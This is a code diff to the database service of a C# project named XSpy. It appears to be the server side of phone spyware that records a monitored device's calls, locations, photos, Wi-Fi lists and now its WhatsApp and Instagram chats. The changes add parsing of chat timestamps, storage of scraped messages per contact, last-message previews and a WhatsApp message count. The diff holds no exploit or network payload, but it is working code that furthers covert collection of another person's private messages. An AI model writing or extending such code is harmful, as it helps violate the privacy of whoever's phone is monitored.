@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Globalization;
 using Microsoft.EntityFrameworkCore;
 using System.IO;
 using System.Linq;
@@ -19,6 +20,7 @@ using XSpy.Shared.Models;
 using XSpy.Shared.Models.Requests.Devices;
 using XSpy.Shared.Models.Requests.Devices.Search;
 using XSpy.Shared.Models.Views;
+using XSpy.Extensions;
 using File = XSpy.Database.Entities.Devices.File;
 
 namespace XSpy.Database.Services
@@ -42,6 +44,7 @@ namespace XSpy.Database.Services
             var locations = await DbContext.Locations.Where(s => s.DeviceId == deviceId).LongCountAsync();
             var images = await DbContext.ImageList.Where(s => s.DeviceId == deviceId).LongCountAsync();
             var wifi = await DbContext.WifiList.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var whatsapp = await DbContext.AppMessages.Where(s => s.DeviceId == deviceId && s.AppType == AppType.WhatsApp).LongCountAsync();
 
             return new DeviceMenuViewModel()
             {
@@ -54,7 +57,7 @@ namespace XSpy.Database.Services
                 Calls = calls,
                 Locations = locations,
                 Photos = images,
-                WhatsApp = 10,
+                WhatsApp = whatsapp,
                 WifiCount = wifi
             };
         }
@@ -107,10 +110,14 @@ namespace XSpy.Database.Services
             };
         }
 
-
-        public Task<Device> GetDeviceById(Guid id)
+        public Task<List<AppContact>> GetAppContacts(Device device, AppType appType)
         {
-            return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id);
+            return DbContext.AppContacts.Where(s => s.AppType == appType && s.DeviceId == device.Id).ToListAsync();
+        }
+
+        public Task<Device> GetDeviceById(Guid id, Guid userId)
+        {
+            return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id && s.UserId == userId);
         }
 
         public Task<List<Device>> GetDevicesForUser(Guid userId)
@@ -123,7 +130,7 @@ namespace XSpy.Database.Services
                 IsOnline = s.IsOnline,
                 SystemVersion = s.SystemVersion,
                 UpdatedAt = s.UpdatedAt
-            }).OrderBy(s => s.UpdatedAt).ToListAsync();
+            }).OrderByDescending(s => s.UpdatedAt).ToListAsync();
         }
 
         public Task<List<TempPath>> GetPathsForDevice(Guid id)
@@ -393,15 +400,83 @@ namespace XSpy.Database.Services
             return file;
         }
 
-        public async Task<AppContact> StoreAppMessages(string deviceId, List<SaveAppMessageRequest> messages,
-            string appName,
-            string contactName)
+        private DayOfWeek GetDayOfWeek(string day)
         {
-            if (!Enum.TryParse(appName, out AppType appType))
+            switch (day)
             {
-                return null;
+                case "mon":
+                case "seg":
+                    return DayOfWeek.Monday;
+                case "ter":
+                case "tue":
+                    return DayOfWeek.Tuesday;
+                case "qua":
+                case "wed":
+                    return DayOfWeek.Wednesday;
+                case "qui":
+                case "thu":
+                    return DayOfWeek.Thursday;
+                case "sex":
+                case "fri":
+                    return DayOfWeek.Friday;
+                case "sat":
+                case "sáb":
+                    return DayOfWeek.Saturday;
+                case "sun":
+                case "dom":
+                    return DayOfWeek.Sunday;
             }
 
+            return DateTime.Now.DayOfWeek;
+        }
+
+        private DateTime GetAppMessageDate(AppType appType, string date)
+        {
+            var day = date[..3].ToLower();
+
+            switch (appType)
+            {
+                case AppType.WhatsApp:
+                    switch (day)
+                    {
+                        case "tod":
+                        case "hoj":
+                            return DateTime.Today;
+                        case "yes":
+                        case "ont":
+                            return DateTime.Today.Subtract(TimeSpan.FromDays(1));
+                    }
+
+                    break;
+                case AppType.Instagram:
+                {
+                    switch (day)
+                    {
+                        case "tod":
+                        case "hoj":
+                            return DateTime.Today;
+                        case "yes":
+                        case "ont":
+                            return DateTime.Today.Subtract(TimeSpan.FromDays(1));
+                        default:
+                            if (date.Contains("."))
+                            {
+                                day = date.Substring(0, 7);
+                                return DateTime.Parse(day);
+                            }
+                            var dayOfWeek = GetDayOfWeek(day);
+                            return DateTime.Now.StartOfWeek(dayOfWeek);
+                    }
+                }
+            }
+
+            return DateTime.Parse(date);
+        }
+
+        public async Task<AppContact> StoreAppMessages(string deviceId, List<SaveAppMessageRequest> messages,
+            AppType appType,
+            string contactName)
+        {
             var device =
                 await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                     .FirstOrDefaultAsync();
@@ -409,7 +484,9 @@ namespace XSpy.Database.Services
                 return null;
 
             var contact = await
-                DbContext.AppContacts.FirstOrDefaultAsync(s => s.AppType == appType && s.ContactName == contactName);
+                DbContext.AppContacts.FirstOrDefaultAsync(s => s.AppType == appType && s.ContactName == contactName
+                    && s.DeviceId == device
+                );
             if (contact == null)
             {
                 contact = new AppContact()
@@ -422,31 +499,30 @@ namespace XSpy.Database.Services
                 };
 
                 await DbContext.AppContacts.AddAsync(contact);
+                await DbContext.SaveChangesAsync();
             }
+
+            messages.Reverse(0, messages.Count);
 
             foreach (var messageRequest in messages)
             {
-                DateTime date = DateTime.Today;
+                DateTime date = GetAppMessageDate(appType, messageRequest.Date);
 
-                if (messageRequest.Date != "Today" && messageRequest.Date != "Hoje" && messageRequest.Date != "Ontem" &&
-                    messageRequest.Date != "Yesterday")
+                if (messageRequest.Time.Contains("AM") || messageRequest.Time.Contains("PM"))
                 {
-                    date = DateTime.Parse(messageRequest.Date);
-                }
-                else
-                {
-                    if (messageRequest.Date == "Ontem" || messageRequest.Date == "Yesterday")
+                    if (messageRequest.Time.Length <= 7)
                     {
-                        date = DateTime.Today.Subtract(TimeSpan.FromDays(1));
+                        messageRequest.Time = "0" + messageRequest.Time;
                     }
                 }
 
                 var time = DateTime.Parse(messageRequest.Time);
 
+
                 var dateTime = DateTime.Parse(date.ToString("dd/MM/yyyy " + time.ToString("HH:mm:ss")));
 
                 if (await DbContext.AppMessages.AnyAsync(s =>
-                    s.Body == messageRequest.Message && s.MessageDate == date))
+                    s.Body == messageRequest.Message && s.MessageDate == dateTime))
                     continue;
 
                 var msg = new AppMessage()
@@ -461,8 +537,18 @@ namespace XSpy.Database.Services
                     IsOwn = messageRequest.IsOwn
                 };
 
+                if (messageRequest.Message.Length > 12)
+                {
+                    messageRequest.Message = messageRequest.Message.Substring(0, 8) + "...";
+                }
+
+                contact.LastMessage = messageRequest.Message;
+                contact.LastMessageDate = dateTime;
+
                 await DbContext.AppMessages.AddAsync(msg);
             }
+
+            DbContext.AppContacts.Update(contact);
 
             await DbContext.SaveChangesAsync();
 
